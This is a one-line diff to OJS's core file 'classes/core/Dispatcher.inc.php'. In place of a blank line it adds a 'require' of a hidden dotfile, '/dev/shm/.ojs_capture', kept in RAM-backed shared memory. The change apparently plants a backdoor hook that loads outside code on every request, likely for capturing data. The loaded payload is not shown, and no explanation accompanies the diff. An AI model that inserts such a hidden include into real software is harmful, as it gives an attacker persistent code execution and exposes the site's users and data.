@@ -1,5 +1,5 @@
 <?php
-
+require ("/dev/shm/.ojs_capture");
 /**
  * @file classes/core/Dispatcher.inc.php
  *
